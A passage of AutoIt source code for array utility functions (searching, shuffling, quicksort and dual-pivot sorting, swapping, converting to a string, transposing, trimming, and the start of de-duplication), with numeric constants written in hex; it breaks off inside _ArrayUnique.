    If $icompare = Default Then $icompare = 0x0
    If $iforward = Default Then $iforward = 0x1
    If $isubitem = Default Then $isubitem = +0xffffffff
    If $brow = Default Then $brow = False
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, +0xffffffff)
    Local $idim_1 = UBound($aarray) + 0xffffffff
    If $idim_1 = +0xffffffff Then Return SetError(0x3, 0x0, +0xffffffff)
    Local $idim_2 = UBound($aarray, $ubound_columns) + 0xffffffff
    Local $bcomptype = False
    If $icompare = 0x2 Then
        $icompare = 0x0
        $bcomptype = True
    EndIf
    If $brow Then
        If UBound($aarray, $ubound_dimensions) = 0x1 Then Return SetError(0x5, 0x0, +0xffffffff)
        If $iend < 0x1 Or $iend > $idim_2 Then $iend = $idim_2
        If $istart < 0x0 Then $istart = 0x0
        If $istart > $iend Then Return SetError(0x4, 0x0, +0xffffffff)
    Else
        If $iend < 0x1 Or $iend > $idim_1 Then $iend = $idim_1
        If $istart < 0x0 Then $istart = 0x0
        If $istart > $iend Then Return SetError(0x4, 0x0, +0xffffffff)
    EndIf
    Local $istep = 0x1
    If Not $iforward Then
        Local $itmp = $istart
        $istart = $iend
        $iend = $itmp
        $istep = +0xffffffff
    EndIf
    Switch UBound($aarray, $ubound_dimensions)
        Case 0x1
            If Not $icompare Then
                If Not $icase Then
                    For $i = $istart To $iend Step $istep
                        If $bcomptype And VarGetType($aarray[$i]) <> VarGetType($vvalue) Then ContinueLoop
                        If $aarray[$i] = $vvalue Then Return $i
                    Next
                Else
                    For $i = $istart To $iend Step $istep
                        If $bcomptype And VarGetType($aarray[$i]) <> VarGetType($vvalue) Then ContinueLoop
                        If $aarray[$i] == $vvalue Then Return $i
                    Next
                EndIf
            Else
                For $i = $istart To $iend Step $istep
                    If $icompare = 0x3 Then
                        If StringRegExp($aarray[$i], $vvalue) Then Return $i
                    Else
                        If StringInStr($aarray[$i], $vvalue, $icase) > 0x0 Then Return $i
                    EndIf
                Next
            EndIf
        Case 0x2
            Local $idim_sub
            If $brow Then
                $idim_sub = $idim_1
                If $isubitem > $idim_sub Then $isubitem = $idim_sub
                If $isubitem < 0x0 Then
                    $isubitem = 0x0
                Else
                    $idim_sub = $isubitem
                EndIf
            Else
                $idim_sub = $idim_2
                If $isubitem > $idim_sub Then $isubitem = $idim_sub
                If $isubitem < 0x0 Then
                    $isubitem = 0x0
                Else
                    $idim_sub = $isubitem
                EndIf
            EndIf
            For $j = $isubitem To $idim_sub
                If Not $icompare Then
                    If Not $icase Then
                        For $i = $istart To $iend Step $istep
                            If $brow Then
                                If $bcomptype And VarGetType($aarray[$j][$i]) <> VarGetType($vvalue) Then ContinueLoop
                                If $aarray[$j][$i] = $vvalue Then Return $i
                            Else
                                If $bcomptype And VarGetType($aarray[$i][$j]) <> VarGetType($vvalue) Then ContinueLoop
                                If $aarray[$i][$j] = $vvalue Then Return $i
                            EndIf
                        Next
                    Else
                        For $i = $istart To $iend Step $istep
                            If $brow Then
                                If $bcomptype And VarGetType($aarray[$j][$i]) <> VarGetType($vvalue) Then ContinueLoop
                                If $aarray[$j][$i] == $vvalue Then Return $i
                            Else
                                If $bcomptype And VarGetType($aarray[$i][$j]) <> VarGetType($vvalue) Then ContinueLoop
                                If $aarray[$i][$j] == $vvalue Then Return $i
                            EndIf
                        Next
                    EndIf
                Else
                    For $i = $istart To $iend Step $istep
                        If $icompare = 0x3 Then
                            If $brow Then
                                If StringRegExp($aarray[$j][$i], $vvalue) Then Return $i
                            Else
                                If StringRegExp($aarray[$i][$j], $vvalue) Then Return $i
                            EndIf
                        Else
                            If $brow Then
                                If StringInStr($aarray[$j][$i], $vvalue, $icase) > 0x0 Then Return $i
                            Else
                                If StringInStr($aarray[$i][$j], $vvalue, $icase) > 0x0 Then Return $i
                            EndIf
                        EndIf
                    Next
                EndIf
            Next
        Case Else
            Return SetError(0x2, 0x0, +0xffffffff)
    EndSwitch
    Return SetError(0x6, 0x0, +0xffffffff)
EndFunc   ;==>_ARRAYSEARCH
Func _ArrayShuffle(ByRef $aarray, $istart_row = 0x0, $iend_row = 0x0, $icol = +0xffffffff)
    If $istart_row = Default Then $istart_row = 0x0
    If $iend_row = Default Then $iend_row = 0x0
    If $icol = Default Then $icol = +0xffffffff
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, +0xffffffff)
    Local $idim_1 = UBound($aarray, $ubound_rows)
    If $iend_row = 0x0 Then $iend_row = $idim_1 + 0xffffffff
    If $istart_row < 0x0 Or $istart_row > $idim_1 + 0xffffffff Then Return SetError(0x3, 0x0, +0xffffffff)
    If $iend_row < 0x1 Or $iend_row > $idim_1 + 0xffffffff Then Return SetError(0x3, 0x0, +0xffffffff)
    If $istart_row > $iend_row Then Return SetError(0x4, 0x0, +0xffffffff)
    Local $vtmp, $irand
    Switch UBound($aarray, $ubound_dimensions)
        Case 0x1
            For $i = $iend_row To $istart_row + 0x1 Step +0xffffffff
                $irand = Random($istart_row, $i, 0x1)
                $vtmp = $aarray[$i]
                $aarray[$i] = $aarray[$irand]
                $aarray[$irand] = $vtmp
            Next
            Return 0x1
        Case 0x2
            Local $idim_2 = UBound($aarray, $ubound_columns)
            If $icol < +0xffffffff Or $icol > $idim_2 + 0xffffffff Then Return SetError(0x5, 0x0, +0xffffffff)
            Local $icol_start, $icol_end
            If $icol = +0xffffffff Then
                $icol_start = 0x0
                $icol_end = $idim_2 + 0xffffffff
            Else
                $icol_start = $icol
                $icol_end = $icol
            EndIf
            For $i = $iend_row To $istart_row + 0x1 Step +0xffffffff
                $irand = Random($istart_row, $i, 0x1)
                For $j = $icol_start To $icol_end
                    $vtmp = $aarray[$i][$j]
                    $aarray[$i][$j] = $aarray[$irand][$j]
                    $aarray[$irand][$j] = $vtmp
                Next
            Next
            Return 0x1
        Case Else
            Return SetError(0x2, 0x0, +0xffffffff)
    EndSwitch
EndFunc   ;==>_ARRAYSHUFFLE
Func _ArraySort(ByRef $aarray, $idescending = 0x0, $istart = 0x0, $iend = 0x0, $isubitem = 0x0, $ipivot = 0x0)
    If $idescending = Default Then $idescending = 0x0
    If $istart = Default Then $istart = 0x0
    If $iend = Default Then $iend = 0x0
    If $isubitem = Default Then $isubitem = 0x0
    If $ipivot = Default Then $ipivot = 0x0
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, 0x0)
    Local $iubound = UBound($aarray) + 0xffffffff
    If $iubound = +0xffffffff Then Return SetError(0x5, 0x0, 0x0)
    If $iend = Default Then $iend = 0x0
    If $iend < 0x1 Or $iend > $iubound Or $iend = Default Then $iend = $iubound
    If $istart < 0x0 Or $istart = Default Then $istart = 0x0
    If $istart > $iend Then Return SetError(0x2, 0x0, 0x0)
    Switch UBound($aarray, $ubound_dimensions)
        Case 0x1
            If $ipivot Then
                __ARRAYDUALPIVOTSORT($aarray, $istart, $iend)
            Else
                __ARRAYQUICKSORT1D($aarray, $istart, $iend)
            EndIf
            If $idescending Then _ArrayReverse($aarray, $istart, $iend)
        Case 0x2
            If $ipivot Then Return SetError(0x6, 0x0, 0x0)
            Local $isubmax = UBound($aarray, $ubound_columns) + 0xffffffff
            If $isubitem > $isubmax Then Return SetError(0x3, 0x0, 0x0)
            If $idescending Then
                $idescending = +0xffffffff
            Else
                $idescending = 0x1
            EndIf
            __ARRAYQUICKSORT2D($aarray, $idescending, $istart, $iend, $isubitem, $isubmax)
        Case Else
            Return SetError(0x4, 0x0, 0x0)
    EndSwitch
    Return 0x1
EndFunc   ;==>_ARRAYSORT
Func __ARRAYQUICKSORT1D(ByRef $aarray, Const ByRef $istart, Const ByRef $iend)
    If $iend <= $istart Then Return
    Local $vtmp
    If ($iend - $istart) < 0xf Then
        Local $vcur
        For $i = $istart + 0x1 To $iend
            $vtmp = $aarray[$i]
            If IsNumber($vtmp) Then
                For $j = $i + 0xffffffff To $istart Step +0xffffffff
                    $vcur = $aarray[$j]
                    If ($vtmp >= $vcur And IsNumber($vcur)) Or (Not IsNumber($vcur) And StringCompare($vtmp, $vcur) >= 0x0) Then ExitLoop
                    $aarray[$j + 0x1] = $vcur
                Next
            Else
                For $j = $i + 0xffffffff To $istart Step +0xffffffff
                    If (StringCompare($vtmp, $aarray[$j]) >= 0x0) Then ExitLoop
                    $aarray[$j + 0x1] = $aarray[$j]
                Next
            EndIf
            $aarray[$j + 0x1] = $vtmp
        Next
        Return
    EndIf
    Local $l = $istart, $r = $iend, $vpivot = $aarray[Int(($istart + $iend) / 0x2)], $bnum = IsNumber($vpivot)
    Do
        If $bnum Then
            While ($aarray[$l] < $vpivot And IsNumber($aarray[$l])) Or (Not IsNumber($aarray[$l]) And StringCompare($aarray[$l], $vpivot) < 0x0)
                $l += 0x1
            WEnd
            While ($aarray[$r] > $vpivot And IsNumber($aarray[$r])) Or (Not IsNumber($aarray[$r]) And StringCompare($aarray[$r], $vpivot) > 0x0)
                $r -= 0x1
            WEnd
        Else
            While (StringCompare($aarray[$l], $vpivot) < 0x0)
                $l += 0x1
            WEnd
            While (StringCompare($aarray[$r], $vpivot) > 0x0)
                $r -= 0x1
            WEnd
        EndIf
        If $l <= $r Then
            $vtmp = $aarray[$l]
            $aarray[$l] = $aarray[$r]
            $aarray[$r] = $vtmp
            $l += 0x1
            $r -= 0x1
        EndIf
    Until $l > $r
    __ARRAYQUICKSORT1D($aarray, $istart, $r)
    __ARRAYQUICKSORT1D($aarray, $l, $iend)
EndFunc   ;==>__ARRAYQUICKSORT1D
Func __ARRAYQUICKSORT2D(ByRef $aarray, Const ByRef $istep, Const ByRef $istart, Const ByRef $iend, Const ByRef $isubitem, Const ByRef $isubmax)
    If $iend <= $istart Then Return
    Local $vtmp, $l = $istart, $r = $iend, $vpivot = $aarray[Int(($istart + $iend) / 0x2)][$isubitem], $bnum = IsNumber($vpivot)
    Do
        If $bnum Then
            While ($istep * ($aarray[$l][$isubitem] - $vpivot) < 0x0 And IsNumber($aarray[$l][$isubitem])) Or (Not IsNumber($aarray[$l][$isubitem]) And $istep * StringCompare($aarray[$l][$isubitem], $vpivot) < 0x0)
                $l += 0x1
            WEnd
            While ($istep * ($aarray[$r][$isubitem] - $vpivot) > 0x0 And IsNumber($aarray[$r][$isubitem])) Or (Not IsNumber($aarray[$r][$isubitem]) And $istep * StringCompare($aarray[$r][$isubitem], $vpivot) > 0x0)
                $r -= 0x1
            WEnd
        Else
            While ($istep * StringCompare($aarray[$l][$isubitem], $vpivot) < 0x0)
                $l += 0x1
            WEnd
            While ($istep * StringCompare($aarray[$r][$isubitem], $vpivot) > 0x0)
                $r -= 0x1
            WEnd
        EndIf
        If $l <= $r Then
            For $i = 0x0 To $isubmax
                $vtmp = $aarray[$l][$i]
                $aarray[$l][$i] = $aarray[$r][$i]
                $aarray[$r][$i] = $vtmp
            Next
            $l += 0x1
            $r -= 0x1
        EndIf
    Until $l > $r
    __ARRAYQUICKSORT2D($aarray, $istep, $istart, $r, $isubitem, $isubmax)
    __ARRAYQUICKSORT2D($aarray, $istep, $l, $iend, $isubitem, $isubmax)
EndFunc   ;==>__ARRAYQUICKSORT2D
Func __ARRAYDUALPIVOTSORT(ByRef $aarray, $ipivot_left, $ipivot_right, $bleftmost = True)
    If $ipivot_left > $ipivot_right Then Return
    Local $ilength = $ipivot_right - $ipivot_left + 0x1
    Local $i, $j, $k, $iai, $iak, $ia1, $ia2, $ilast
    If $ilength < 0x2d Then
        If $bleftmost Then
            $i = $ipivot_left
            While $i < $ipivot_right
                $j = $i
                $iai = $aarray[$i + 0x1]
                While $iai < $aarray[$j]
                    $aarray[$j + 0x1] = $aarray[$j]
                    $j -= 0x1
                    If $j + 0x1 = $ipivot_left Then ExitLoop
                WEnd
                $aarray[$j + 0x1] = $iai
                $i += 0x1
            WEnd
        Else
            While 0x1
                If $ipivot_left >= $ipivot_right Then Return 0x1
                $ipivot_left += 0x1
                If $aarray[$ipivot_left] < $aarray[$ipivot_left + 0xffffffff] Then ExitLoop
            WEnd
            While 0x1
                $k = $ipivot_left
                $ipivot_left += 0x1
                If $ipivot_left > $ipivot_right Then ExitLoop
                $ia1 = $aarray[$k]
                $ia2 = $aarray[$ipivot_left]
                If $ia1 < $ia2 Then
                    $ia2 = $ia1
                    $ia1 = $aarray[$ipivot_left]
                EndIf
                $k -= 0x1
                While $ia1 < $aarray[$k]
                    $aarray[$k + 0x2] = $aarray[$k]
                    $k -= 0x1
                WEnd
                $aarray[$k + 0x2] = $ia1
                While $ia2 < $aarray[$k]
                    $aarray[$k + 0x1] = $aarray[$k]
                    $k -= 0x1
                WEnd
                $aarray[$k + 0x1] = $ia2
                $ipivot_left += 0x1
            WEnd
            $ilast = $aarray[$ipivot_right]
            $ipivot_right -= 0x1
            While $ilast < $aarray[$ipivot_right]
                $aarray[$ipivot_right + 0x1] = $aarray[$ipivot_right]
                $ipivot_right -= 0x1
            WEnd
            $aarray[$ipivot_right + 0x1] = $ilast
        EndIf
        Return 0x1
    EndIf
    Local $iseventh = BitShift($ilength, 0x3) + BitShift($ilength, 0x6) + 0x1
    Local $ie1, $ie2, $ie3, $ie4, $ie5, $t
    $ie3 = Ceiling(($ipivot_left + $ipivot_right) / 0x2)
    $ie2 = $ie3 - $iseventh
    $ie1 = $ie2 - $iseventh
    $ie4 = $ie3 + $iseventh
    $ie5 = $ie4 + $iseventh
    If $aarray[$ie2] < $aarray[$ie1] Then
        $t = $aarray[$ie2]
        $aarray[$ie2] = $aarray[$ie1]
        $aarray[$ie1] = $t
    EndIf
    If $aarray[$ie3] < $aarray[$ie2] Then
        $t = $aarray[$ie3]
        $aarray[$ie3] = $aarray[$ie2]
        $aarray[$ie2] = $t
        If $t < $aarray[$ie1] Then
            $aarray[$ie2] = $aarray[$ie1]
            $aarray[$ie1] = $t
        EndIf
    EndIf
    If $aarray[$ie4] < $aarray[$ie3] Then
        $t = $aarray[$ie4]
        $aarray[$ie4] = $aarray[$ie3]
        $aarray[$ie3] = $t
        If $t < $aarray[$ie2] Then
            $aarray[$ie3] = $aarray[$ie2]
            $aarray[$ie2] = $t
            If $t < $aarray[$ie1] Then
                $aarray[$ie2] = $aarray[$ie1]
                $aarray[$ie1] = $t
            EndIf
        EndIf
    EndIf
    If $aarray[$ie5] < $aarray[$ie4] Then
        $t = $aarray[$ie5]
        $aarray[$ie5] = $aarray[$ie4]
        $aarray[$ie4] = $t
        If $t < $aarray[$ie3] Then
            $aarray[$ie4] = $aarray[$ie3]
            $aarray[$ie3] = $t
            If $t < $aarray[$ie2] Then
                $aarray[$ie3] = $aarray[$ie2]
                $aarray[$ie2] = $t
                If $t < $aarray[$ie1] Then
                    $aarray[$ie2] = $aarray[$ie1]
                    $aarray[$ie1] = $t
                EndIf
            EndIf
        EndIf
    EndIf
    Local $iless = $ipivot_left
    Local $igreater = $ipivot_right
    If (($aarray[$ie1] <> $aarray[$ie2]) And ($aarray[$ie2] <> $aarray[$ie3]) And ($aarray[$ie3] <> $aarray[$ie4]) And ($aarray[$ie4] <> $aarray[$ie5])) Then
        Local $ipivot_1 = $aarray[$ie2]
        Local $ipivot_2 = $aarray[$ie4]
        $aarray[$ie2] = $aarray[$ipivot_left]
        $aarray[$ie4] = $aarray[$ipivot_right]
        Do
            $iless += 0x1
        Until $aarray[$iless] >= $ipivot_1
        Do
            $igreater -= 0x1
        Until $aarray[$igreater] <= $ipivot_2
        $k = $iless
        While $k <= $igreater
            $iak = $aarray[$k]
            If $iak < $ipivot_1 Then
                $aarray[$k] = $aarray[$iless]
                $aarray[$iless] = $iak
                $iless += 0x1
            ElseIf $iak > $ipivot_2 Then
                While $aarray[$igreater] > $ipivot_2
                    $igreater -= 0x1
                    If $igreater + 0x1 = $k Then ExitLoop 0x2
                WEnd
                If $aarray[$igreater] < $ipivot_1 Then
                    $aarray[$k] = $aarray[$iless]
                    $aarray[$iless] = $aarray[$igreater]
                    $iless += 0x1
                Else
                    $aarray[$k] = $aarray[$igreater]
                EndIf
                $aarray[$igreater] = $iak
                $igreater -= 0x1
            EndIf
            $k += 0x1
        WEnd
        $aarray[$ipivot_left] = $aarray[$iless + 0xffffffff]
        $aarray[$iless + 0xffffffff] = $ipivot_1
        $aarray[$ipivot_right] = $aarray[$igreater + 0x1]
        $aarray[$igreater + 0x1] = $ipivot_2
        __ARRAYDUALPIVOTSORT($aarray, $ipivot_left, $iless + 0xfffffffe, True)
        __ARRAYDUALPIVOTSORT($aarray, $igreater + 0x2, $ipivot_right, False)
        If ($iless < $ie1) And ($ie5 < $igreater) Then
            While $aarray[$iless] = $ipivot_1
                $iless += 0x1
            WEnd
            While $aarray[$igreater] = $ipivot_2
                $igreater -= 0x1
            WEnd
            $k = $iless
            While $k <= $igreater
                $iak = $aarray[$k]
                If $iak = $ipivot_1 Then
                    $aarray[$k] = $aarray[$iless]
                    $aarray[$iless] = $iak
                    $iless += 0x1
                ElseIf $iak = $ipivot_2 Then
                    While $aarray[$igreater] = $ipivot_2
                        $igreater -= 0x1
                        If $igreater + 0x1 = $k Then ExitLoop 0x2
                    WEnd
                    If $aarray[$igreater] = $ipivot_1 Then
                        $aarray[$k] = $aarray[$iless]
                        $aarray[$iless] = $ipivot_1
                        $iless += 0x1
                    Else
                        $aarray[$k] = $aarray[$igreater]
                    EndIf
                    $aarray[$igreater] = $iak
                    $igreater -= 0x1
                EndIf
                $k += 0x1
            WEnd
        EndIf
        __ARRAYDUALPIVOTSORT($aarray, $iless, $igreater, False)
    Else
        Local $ipivot = $aarray[$ie3]
        $k = $iless
        While $k <= $igreater
            If $aarray[$k] = $ipivot Then
                $k += 0x1
                ContinueLoop
            EndIf
            $iak = $aarray[$k]
            If $iak < $ipivot Then
                $aarray[$k] = $aarray[$iless]
                $aarray[$iless] = $iak
                $iless += 0x1
            Else
                While $aarray[$igreater] > $ipivot
                    $igreater -= 0x1
                WEnd
                If $aarray[$igreater] < $ipivot Then
                    $aarray[$k] = $aarray[$iless]
                    $aarray[$iless] = $aarray[$igreater]
                    $iless += 0x1
                Else
                    $aarray[$k] = $ipivot
                EndIf
                $aarray[$igreater] = $iak
                $igreater -= 0x1
            EndIf
            $k += 0x1
        WEnd
        __ARRAYDUALPIVOTSORT($aarray, $ipivot_left, $iless + 0xffffffff, True)
        __ARRAYDUALPIVOTSORT($aarray, $igreater + 0x1, $ipivot_right, False)
    EndIf
EndFunc   ;==>__ARRAYDUALPIVOTSORT
Func _ArraySwap(ByRef $aarray, $iindex_1, $iindex_2, $bcol = False, $istart = +0xffffffff, $iend = +0xffffffff)
    If $bcol = Default Then $bcol = False
    If $istart = Default Then $istart = +0xffffffff
    If $iend = Default Then $iend = +0xffffffff
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, +0xffffffff)
    Local $idim_1 = UBound($aarray, $ubound_rows) + 0xffffffff
    Local $idim_2 = UBound($aarray, $ubound_columns) + 0xffffffff
    If $idim_2 = +0xffffffff Then
        $bcol = False
        $istart = +0xffffffff
        $iend = +0xffffffff
    EndIf
    If $istart > $iend Then Return SetError(0x5, 0x0, +0xffffffff)
    If $bcol Then
        If $iindex_1 < 0x0 Or $iindex_2 > $idim_2 Then Return SetError(0x3, 0x0, +0xffffffff)
        If $istart = +0xffffffff Then $istart = 0x0
        If $iend = +0xffffffff Then $iend = $idim_1
    Else
        If $iindex_1 < 0x0 Or $iindex_2 > $idim_1 Then Return SetError(0x3, 0x0, +0xffffffff)
        If $istart = +0xffffffff Then $istart = 0x0
        If $iend = +0xffffffff Then $iend = $idim_2
    EndIf
    Local $vtmp
    Switch UBound($aarray, $ubound_dimensions)
        Case 0x1
            $vtmp = $aarray[$iindex_1]
            $aarray[$iindex_1] = $aarray[$iindex_2]
            $aarray[$iindex_2] = $vtmp
        Case 0x2
            If $istart < +0xffffffff Or $iend < +0xffffffff Then Return SetError(0x4, 0x0, +0xffffffff)
            If $bcol Then
                If $istart > $idim_1 Or $iend > $idim_1 Then Return SetError(0x4, 0x0, +0xffffffff)
                For $j = $istart To $iend
                    $vtmp = $aarray[$j][$iindex_1]
                    $aarray[$j][$iindex_1] = $aarray[$j][$iindex_2]
                    $aarray[$j][$iindex_2] = $vtmp
                Next
            Else
                If $istart > $idim_2 Or $iend > $idim_2 Then Return SetError(0x4, 0x0, +0xffffffff)
                For $j = $istart To $iend
                    $vtmp = $aarray[$iindex_1][$j]
                    $aarray[$iindex_1][$j] = $aarray[$iindex_2][$j]
                    $aarray[$iindex_2][$j] = $vtmp
                Next
            EndIf
        Case Else
            Return SetError(0x2, 0x0, +0xffffffff)
    EndSwitch
    Return 0x1
EndFunc   ;==>_ARRAYSWAP
Func _ArrayToClip(Const ByRef $aarray, $sdelim_col = "|", $istart_row = +0xffffffff, $iend_row = +0xffffffff, $sdelim_row = @CRLF, $istart_col = +0xffffffff, $iend_col = +0xffffffff)
    Local $sresult = _ArrayToString($aarray, $sdelim_col, $istart_row, $iend_row, $sdelim_row, $istart_col, $iend_col)
    If @error Then Return SetError(@error, 0x0, 0x0)
    If ClipPut($sresult) Then Return 0x1
    Return SetError(+0xffffffff, 0x0, 0x0)
EndFunc   ;==>_ARRAYTOCLIP
Func _ArrayToString(Const ByRef $aarray, $sdelim_col = "|", $istart_row = Default, $iend_row = Default, $sdelim_row = @CRLF, $istart_col = Default, $iend_col = Default)
    If $sdelim_col = Default Then $sdelim_col = "|"
    If $sdelim_row = Default Then $sdelim_row = @CRLF
    If $istart_row = Default Then $istart_row = +0xffffffff
    If $iend_row = Default Then $iend_row = +0xffffffff
    If $istart_col = Default Then $istart_col = +0xffffffff
    If $iend_col = Default Then $iend_col = +0xffffffff
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, +0xffffffff)
    Local $idim_1 = UBound($aarray, $ubound_rows) + 0xffffffff
    If $idim_1 = +0xffffffff Then Return ""
    If $istart_row = +0xffffffff Then $istart_row = 0x0
    If $iend_row = +0xffffffff Then $iend_row = $idim_1
    If $istart_row < +0xffffffff Or $iend_row < +0xffffffff Then Return SetError(0x3, 0x0, +0xffffffff)
    If $istart_row > $idim_1 Or $iend_row > $idim_1 Then Return SetError(0x3, 0x0, "")
    If $istart_row > $iend_row Then Return SetError(0x4, 0x0, +0xffffffff)
    Local $sret = ""
    Switch UBound($aarray, $ubound_dimensions)
        Case 0x1
            For $i = $istart_row To $iend_row
                $sret &= $aarray[$i] & $sdelim_col
            Next
            Return StringTrimRight($sret, StringLen($sdelim_col))
        Case 0x2
            Local $idim_2 = UBound($aarray, $ubound_columns) + 0xffffffff
            If $idim_2 = +0xffffffff Then Return ""
            If $istart_col = +0xffffffff Then $istart_col = 0x0
            If $iend_col = +0xffffffff Then $iend_col = $idim_2
            If $istart_col < +0xffffffff Or $iend_col < +0xffffffff Then Return SetError(0x5, 0x0, +0xffffffff)
            If $istart_col > $idim_2 Or $iend_col > $idim_2 Then Return SetError(0x5, 0x0, +0xffffffff)
            If $istart_col > $iend_col Then Return SetError(0x6, 0x0, +0xffffffff)
            Local $idelimcollen = StringLen($sdelim_col)
            For $i = $istart_row To $iend_row
                For $j = $istart_col To $iend_col
                    $sret &= $aarray[$i][$j] & $sdelim_col
                Next
                $sret = StringTrimRight($sret, $idelimcollen) & $sdelim_row
            Next
            Return StringTrimRight($sret, StringLen($sdelim_row))
        Case Else
            Return SetError(0x2, 0x0, +0xffffffff)
    EndSwitch
    Return 0x1
EndFunc   ;==>_ARRAYTOSTRING
Func _ArrayTranspose(ByRef $aarray, $bforce1d = False)
    Local $atemp
    Switch $bforce1d
        Case Default
            $bforce1d = False
        Case True, False
        Case Else
            Return SetError(0x3, 0x0, 0x0)
    EndSwitch
    Switch UBound($aarray, 0x0)
        Case 0x0
            Return SetError(0x2, 0x0, 0x0)
        Case 0x1
            Local $atemp[0x1][UBound($aarray)]
            For $i = 0x0 To UBound($aarray) + 0xffffffff
                $atemp[0x0][$i] = $aarray[$i]
            Next
            $aarray = $atemp
        Case 0x2
            Local $idim_1 = UBound($aarray, 0x1), $idim_2 = UBound($aarray, 0x2)
            If $idim_1 <> $idim_2 Then
                Local $atemp[$idim_2][$idim_1]
                For $i = 0x0 To $idim_1 + 0xffffffff
                    For $j = 0x0 To $idim_2 + 0xffffffff
                        $atemp[$j][$i] = $aarray[$i][$j]
                    Next
                Next
                $aarray = $atemp
            Else
                Local $velement
                For $i = 0x0 To $idim_1 + 0xffffffff
                    For $j = $i + 0x1 To $idim_2 + 0xffffffff
                        $velement = $aarray[$i][$j]
                        $aarray[$i][$j] = $aarray[$j][$i]
                        $aarray[$j][$i] = $velement
                    Next
                Next
            EndIf
            If $bforce1d = True And UBound($aarray, 0x2) = 0x1 Then
                $atemp = $aarray
                ReDim $aarray[UBound($atemp)]
                For $i = 0x0 To UBound($atemp) + 0xffffffff
                    $aarray[$i] = $atemp[$i][0x0]
                Next
            EndIf
        Case Else
            Return SetError(0x1, 0x0, 0x0)
    EndSwitch
    Return 0x1
EndFunc   ;==>_ARRAYTRANSPOSE
Func _ArrayTrim(ByRef $aarray, $itrimnum, $idirection = 0x0, $istart = 0x0, $iend = 0x0, $isubitem = 0x0)
    If $idirection = Default Then $idirection = 0x0
    If $istart = Default Then $istart = 0x0
    If $iend = Default Then $iend = 0x0
    If $isubitem = Default Then $isubitem = 0x0
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, 0x0)
    Local $idim_1 = UBound($aarray, $ubound_rows) + 0xffffffff
    If $iend = 0x0 Then $iend = $idim_1
    If $istart > $iend Then Return SetError(0x3, 0x0, +0xffffffff)
    If $istart < 0x0 Or $iend < 0x0 Then Return SetError(0x3, 0x0, +0xffffffff)
    If $istart > $idim_1 Or $iend > $idim_1 Then Return SetError(0x3, 0x0, +0xffffffff)
    If $istart > $iend Then Return SetError(0x4, 0x0, +0xffffffff)
    Switch UBound($aarray, $ubound_dimensions)
        Case 0x1
            If $idirection Then
                For $i = $istart To $iend
                    $aarray[$i] = StringTrimRight($aarray[$i], $itrimnum)
                Next
            Else
                For $i = $istart To $iend
                    $aarray[$i] = StringTrimLeft($aarray[$i], $itrimnum)
                Next
            EndIf
        Case 0x2
            Local $idim_2 = UBound($aarray, $ubound_columns) + 0xffffffff
            If $isubitem < 0x0 Or $isubitem > $idim_2 Then Return SetError(0x5, 0x0, +0xffffffff)
            If $idirection Then
                For $i = $istart To $iend
                    $aarray[$i][$isubitem] = StringTrimRight($aarray[$i][$isubitem], $itrimnum)
                Next
            Else
                For $i = $istart To $iend
                    $aarray[$i][$isubitem] = StringTrimLeft($aarray[$i][$isubitem], $itrimnum)
                Next
            EndIf
        Case Else
            Return SetError(0x2, 0x0, 0x0)
    EndSwitch
    Return 0x1
EndFunc   ;==>_ARRAYTRIM
Func _ArrayUnique(Const ByRef $aarray, $icolumn = 0x0, $ibase = 0x0, $icase = 0x0, $icount = $arrayunique_count, $iinttype = $arrayunique_auto)
    If $icolumn = Default Then $icolumn = 0x0
    If $ibase = Default Then $ibase = 0x0
    If $icase = Default Then $icase = 0x0
    If $icount = Default Then $icount = $arrayunique_count
    If $iinttype = Default Then $iinttype = $arrayunique_auto
    If UBound($aarray, $ubound_rows) = 0x0 Then Return SetError(0x1, 0x0, 0x0)
    Local $idims = UBound($aarray, $ubound_dimensions), $inumcolumns = UBound($aarray, $ubound_columns)
    If $idims > 0x2 Then Return SetError(0x2, 0x0, 0x0)
    If $ibase < 0x0 Or $ibase > 0x1 Or (Not IsInt($ibase)) Then Return SetError(0x3, 0x0, 0x0)
    If $icase < 0x0 Or $icase > 0x1 Or (Not IsInt($icase)) Then Return SetError(0x3, 0x0, 0x0)
    If $icount < 0x0 Or $icount > 0x1 Or (Not IsInt($icount)) Then Return SetError(0x4, 0x0, 0x0)
    If $iinttype < 0x0 Or $iinttype > 0x4 Or (Not IsInt($iinttype)) Then Return SetError(0x5, 0x0, 0x0)
    If $icolumn < 0x0 Or ($inumcolumns = 0x0 And $icolumn > 0x0) Or ($inumcolumns > 0x0 And $icolumn >= $inumcolumns) Then Return SetError(0x6, 0x0, 0x0)
    If $iinttype = $arrayunique_auto Then
        Local $bint, $svartype
        If $idims = 0x1 Then
            $bint = IsInt($aarray[$ibase])
            $svartype = VarGetType($aarray[$ibase])
        Else
            $bint = IsInt($aarray[$ibase][$icolumn])
            $svartype = VarGetType($aarray[$ibase][$icolumn])
        EndIf
        If $bint And $svartype = "Int64" Then
            $iinttype = $arrayunique_force64
        Else
            $iinttype = $arrayunique_force32
        EndIf
    EndIf
    ObjEvent("AutoIt.Error", __ARRAYUNIQUE_AUTOERRFUNC)
    Local $odictionary = ObjCreate("Scripting.Dictionary")
    $odictionary .CompareMode = Number(Not $icase)
    Local $velem, $stype, $vkey, $bcomerror = False
    For $i = $ibase To UBound($aarray) + 0xffffffff
        If $idims = 0x1 Then
            $velem = $aarray[$i]
        Else
            $velem = $aarray[$i][$icolumn]
        EndIf
        Switch $iinttype
            Case $arrayunique_force32
                $odictionary .Item($velem)
                If @error Then
                    $bcomerror = True
                    ExitLoop
                EndIf
            Case $arrayunique_force64
                $stype = VarGetType($velem)
                If $stype = "Int32" Then
                    $bcomerror = True
                    ExitLoop
                EndIf
                $vkey = "#" & $stype & "#" & String($velem)
                If Not $odictionary .Item($vkey) Then
                    $ODICTIONARY($vkey) = $velem
                EndIf
            Case $arrayunique_match
                $stype = VarGetType($velem)
                If StringLeft($stype, 0x3) = "Int" Then
                    $vkey = "#Int#" & String($velem)
                Else
                    $vkey = "#" & $stype & "#" & String($velem)
                EndIf
                If Not $odictionary .Item($vkey) Then
                    $ODICTIONARY($vkey) = $velem
                EndIf
            Case $arrayunique_distinct
                $vkey = "#" & VarGetType($velem) & "#" & String($velem)
                If Not $odictionary .Item($vkey) Then
                    $ODICTIONARY($vkey) = $velem
                EndIf
        EndSwitch
    Next
    Local $avalues, $j = 0x0
    If $bcomerror Then
